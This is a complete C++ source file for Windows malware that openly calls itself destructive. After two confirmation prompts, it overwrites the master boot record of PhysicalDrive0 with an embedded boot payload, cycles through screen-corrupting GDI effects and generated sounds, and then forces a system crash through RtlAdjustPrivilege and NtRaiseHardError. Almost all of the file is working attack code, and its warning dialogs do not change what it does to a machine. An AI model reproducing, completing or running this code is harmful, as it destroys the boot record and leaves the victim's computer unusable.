#include <windows.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
#define _USE_MATH_DEFINES 1
#include <cmath>
//externing rtladjustprivilege
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
//externing ntraiseharderror
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);


static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }

const unsigned char MasterBootRecord[] = {0xB4, 0x02, 0xB0, 0x02, 0xB5, 0x00, 0xB1, 0x02, 0xB6, 0x00, 0xBB, 0x00, 0x7E, 0xCD, 0x13, 0xE9, 
0xEE, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA, 
0xBD, 0x80, 0xFC, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xCD, 0x1A, 0x89, 0x56, 0x08, 0xB8, 0x00, 0xA0, 
0x8E, 0xD8, 0x8E, 0xC0, 0xB0, 0x6B, 0x89, 0xE9, 0x31, 0xFF, 0xF3, 0xAA, 0x30, 0xC0, 0xBF, 0x80, 
0x2D, 0xBA, 0x80, 0x00, 0xB1, 0x40, 0xF3, 0xAA, 0x81, 0xC7, 0x00, 0x01, 0x4A, 0x75, 0xF5, 0x88, 
0x46, 0x0A, 0xBB, 0x72, 0x7F, 0xE8, 0x27, 0x02, 0xE8, 0x3E, 0x02, 0x88, 0x46, 0x02, 0xE8, 0x38, 
0x02, 0x88, 0x46, 0x03, 0xBF, 0x98, 0x2D, 0xBB, 0x08, 0x00, 0x89, 0x5E, 0x04, 0xE8, 0xA9, 0x00, 
0x75, 0xAE, 0x8B, 0x7E, 0x00, 0xB4, 0x01, 0xCD, 0x16, 0x74, 0x08, 0xB4, 0x00, 0xCD, 0x16, 0x88, 
0xE3, 0xEB, 0xF2, 0x88, 0xD8, 0x3C, 0x4B, 0x75, 0x06, 0x83, 0xEF, 0x08, 0xE8, 0x85, 0x00, 0x3C, 
0x4D, 0x75, 0x06, 0x83, 0xC7, 0x08, 0xE8, 0x7B, 0x00, 0x3C, 0x50, 0x74, 0x35, 0x30, 0xC9, 0x3C, 
0x1E, 0x74, 0x06, 0xB1, 0x08, 0x3C, 0x1F, 0x75, 0x1A, 0xE8, 0x7E, 0x00, 0xBB, 0x08, 0xF6, 0x33, 
0x5E, 0x04, 0xF6, 0x41, 0x05, 0xFF, 0x75, 0x08, 0x89, 0x5E, 0x04, 0x30, 0xD9, 0xD3, 0x4E, 0x02, 
0xE8, 0x77, 0x00, 0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x56, 0x06, 0x72, 0xA6, 0x83, 0xC2, 0x04, 0x89, 
0x56, 0x06, 0x81, 0xC7, 0x00, 0x0A, 0xE8, 0x3B, 0x00, 0x74, 0x97, 0xBB, 0x88, 0x7F, 0xE8, 0x9E, 
0x01, 0xD0, 0x6E, 0x0B, 0x73, 0x1B, 0xE8, 0x23, 0x00, 0xBB, 0xFF, 0x7F, 0xE8, 0x90, 0x01, 0xBB, 
0x0B, 0x80, 0xE8, 0x8A, 0x01, 0xD0, 0x6E, 0x0B, 0x73, 0x05, 0xE8, 0x0F, 0x00, 0xEB, 0xF0, 0xEB, 
0xDA, 0x80, 0x7E, 0x0A, 0x00, 0x0F, 0x87, 0x4F, 0xFF, 0xF4, 0xEB, 0xFD, 0xB9, 0x03, 0x00, 0xB4, 
0x86, 0xCD, 0x15, 0xC3, 0x57, 0xE8, 0x12, 0x00, 0x5F, 0x8A, 0x45, 0x05, 0x0A, 0x41, 0x05, 0x75, 
0x03, 0x89, 0x7E, 0x00, 0x9C, 0xE8, 0x12, 0x00, 0x9D, 0xC3, 0x31, 0xC0, 0xE8, 0x0E, 0x00, 0xC6, 
0x45, 0x07, 0x00, 0x29, 0xDF, 0xC6, 0x45, 0x07, 0x00, 0xC3, 0x8B, 0x46, 0x02, 0x8B, 0x7E, 0x00, 
0x8B, 0x5E, 0x04, 0xBE, 0x92, 0x80, 0xBA, 0xFF, 0xFD, 0x85, 0xDB, 0x78, 0x06, 0xBE, 0x9C, 0x80, 
0xBA, 0xFB, 0xFC, 0xE8, 0x0E, 0x00, 0x88, 0x55, 0x07, 0x88, 0xE0, 0x01, 0xDF, 0xE8, 0x04, 0x00, 
0x88, 0x75, 0x07, 0xC3, 0x60, 0xC6, 0x45, 0x07, 0x00, 0x88, 0xC4, 0xBA, 0x07, 0x00, 0x2E, 0xAC, 
0x88, 0xC3, 0xB9, 0x07, 0x00, 0x30, 0xC0, 0xD0, 0xC3, 0x73, 0x02, 0x88, 0xE0, 0xAA, 0xE2, 0xF5, 
0x81, 0xC7, 0x39, 0x01, 0xD0, 0xE3, 0x4A, 0x72, 0xE9, 0x75, 0xE3, 0x89, 0xE5, 0x89, 0x76, 0x02, 
0x61, 0xC3, 0xE8, 0x04, 0x01, 0x80, 0xFC, 0xDC, 0x72, 0xF7, 0x80, 0x7E, 0x0A, 0x08, 0x74, 0xF1, 
0xFE, 0x46, 0x0A, 0xBE, 0xB2, 0x80, 0xEB, 0xBC, 0xBB, 0x08, 0x00, 0xE8, 0x03, 0x00, 0xBB, 0x00, 
0x0A, 0x57, 0x8A, 0x45, 0x05, 0x84, 0xC0, 0x74, 0x3E, 0xB9, 0x03, 0x00, 0x01, 0xDF, 0x3A, 0x45, 
0x05, 0x75, 0x34, 0xE2, 0xF7, 0xB9, 0x04, 0x00, 0x80, 0xBD, 0xC3, 0x03, 0x00, 0x75, 0x03, 0xFE, 
0x4E, 0x0A, 0x8A, 0x55, 0x07, 0xBE, 0xAD, 0x80, 0xE8, 0x89, 0xFF, 0xE8, 0x1B, 0x00, 0x75, 0x0F, 
0xBE, 0xA7, 0x80, 0x01, 0xD7, 0x50, 0x8A, 0x45, 0x05, 0xE8, 0x78, 0xFF, 0x58, 0x29, 0xD7, 0x29, 
0xDF, 0xE2, 0xDF, 0xC6, 0x46, 0x0B, 0x01, 0x5F, 0xC3, 0x80, 0xFA, 0xFF, 0x75, 0x04, 0xBA, 0x00, 
0xF6, 0xC3, 0x80, 0xFA, 0xFD, 0x75, 0x04, 0xBA, 0x00, 0x0A, 0xC3, 0x80, 0xFA, 0xFC, 0x75, 0x04, 
0xBA, 0xF8, 0xFF, 0xC3, 0x80, 0xFA, 0xFB, 0xBA, 0x08, 0x00, 0x75, 0x02, 0xB2, 0x00, 0xC3, 0xF6, 
0x85, 0x83, 0x02, 0xFF, 0x75, 0xD2, 0x30, 0xC0, 0xE9, 0x39, 0xFF, 0x80, 0xBD, 0xC3, 0x03, 0x00, 
0x74, 0xC6, 0x80, 0xBD, 0x05, 0x0A, 0x00, 0x75, 0xBF, 0x8A, 0x45, 0x07, 0x89, 0xFE, 0x81, 0xC7, 
0x00, 0x0A, 0x3C, 0xFC, 0x74, 0x04, 0x3C, 0xFB, 0x75, 0x18, 0x88, 0xC2, 0xE8, 0xAA, 0xFF, 0x89, 
0xD3, 0x80, 0x79, 0x05, 0x00, 0x75, 0xA1, 0x01, 0xD6, 0x01, 0xD7, 0xE8, 0x08, 0x00, 0x29, 0xD7, 
0x29, 0xD6, 0xC6, 0x46, 0x0B, 0x01, 0xBB, 0x08, 0x00, 0xB9, 0x08, 0x00, 0xA4, 0xC6, 0x44, 0xFF, 
0x00, 0xE2, 0xF9, 0x81, 0xC7, 0x38, 0x01, 0x81, 0xC6, 0x38, 0x01, 0x4B, 0x75, 0xEB, 0xC3, 0xBF, 
0xB8, 0xC3, 0xB9, 0x08, 0x00, 0x60, 0xFF, 0xD3, 0x61, 0x83, 0xEF, 0x08, 0xE2, 0xF7, 0x81, 0xEF, 
0xC0, 0x09, 0x81, 0xFF, 0x80, 0x2D, 0x77, 0xEA, 0xC3, 0x8B, 0x46, 0x08, 0x89, 0xC3, 0x30, 0xFB, 
0xC1, 0xE8, 0x07, 0x88, 0xDC, 0x89, 0x46, 0x08, 0x24, 0x03, 0x74, 0xED, 0xBB, 0xB8, 0x80, 0x2E, 
0xD7, 0xC3, 0xBF, 0xBF, 0xBE, 0xFE, 0x7C, 0x7C, 0xDE, 0xBF, 0xBF, 0xFE, 0x7E, 0xC2, 0xBE, 0xFF, 
0xFE, 0x7E, 0xFC, 0x06, 0xFF, 0xFF, 0xFC, 0x7C, 0xDE, 0xBF, 0xBE, 0xFE, 0x7C, 0x7C, 0x83, 0x83, 
0x82, 0x7C, 0xC6, 0x38, 0x10, 0xAA, 0xFE, 0x92, 0x7C, 0x2C, 0x27, 0x36
};

void mbr()
{    
    // Again no skidded from SleepMod
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 1536, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}

DWORD WINAPI glitch1(LPVOID lpParam) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	
	while (true)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int y = rand()%sh, h = sh - rand()%sh - (sh / 1 - 8);
		HBRUSH brush = CreateSolidBrush(RGB(rand()%255, rand()%255, rand()%255));
	    SelectObject(hdc, brush);
	    BitBlt(hdc, 0, y, sw, h, hdc, rand() % 96 - 56, y, SRCCOPY);
	    PatBlt(hdc, -1, y, sw, h, PATINVERT);
	    Sleep(10);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, 4 * h * w, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 10)
            byte = randy()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h == 0 && randy() % 100==0)
                v = randy() % 25;
            ((BYTE*)(data + i + v))[v % 6] = ((BYTE*)(data + i))[v] ^ byte;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 

DWORD WINAPI shader3(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = randy()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h && randy() % 110)
                v = randy() % 24;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 
DWORD WINAPI shader4(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, 4 * h * w, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 10)
            byte = randy()%0xff;
        for (int i = 0; w * h > i; i++) {
            if ((i % h) && (randy() % 110))
                v = randy() % 24;
            *((BYTE*)data + 4 * i + v) =i;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 
DWORD WINAPI shader5(LPVOID lpParam) {
	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xffffff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0) v = rand() % 50;
			((BYTE*)(data + i))[v ? 252 : 252] += ((BYTE*)(data + i))[i % 3] ^ bt;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}
DWORD WINAPI sines(LPVOID lpParam) {
  HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
  int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
  double angle = 0;
  while (1) {
    desk = GetDC(0);
    for (float i = 0; i < sw + sh; i += 0.99f) {
      int a = sin(angle) * 200;
      BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
      angle += M_PI / 40;
      DeleteObject(&i); DeleteObject(&a);
    }
    ReleaseDC(wnd, desk);
    DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
  }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t | (t >> 9 | t >> 7)) * t & (t >> 11 | t >> 9));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t>>6|t|t>>(t>>16))*10+((t>>11)&7);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*t/(1+(t>>9&t>>8))&128);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(3+(1^t>>10&5))*(5+(3&t>>14))>>(t>>8&3));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t+(t&t^t>>6)-t*(t>>9&(t%16?2:6)&t>>9));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(0xCA98>>(t>>9&14)&15)|t>>8);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int main(){
	    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"J241213.22+233452.1.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"J241213.22+233452.1.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else{
        	mbr();
        	HANDLE thread1 = CreateThread(0, 0, glitch1, 0, 0, 0);
        	sound1();
        	Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
    		sound2();
			Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
    		sound3();
			Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
    		sound4();
			Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
    		sound5();
			Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread6 = CreateThread(0, 0, sines, 0, 0, 0);
    		sound6();
			Sleep(30000);
			//boolean
			BOOLEAN b;
			//bsod response
			unsigned long response;
			//process privilege
			RtlAdjustPrivilege(19, true, false, &b);
			//call bsod
			NtRaiseHardError(0xC0000221, 0, 0, 0, 6, &response);
        	Sleep(-1);
		}
	}
}
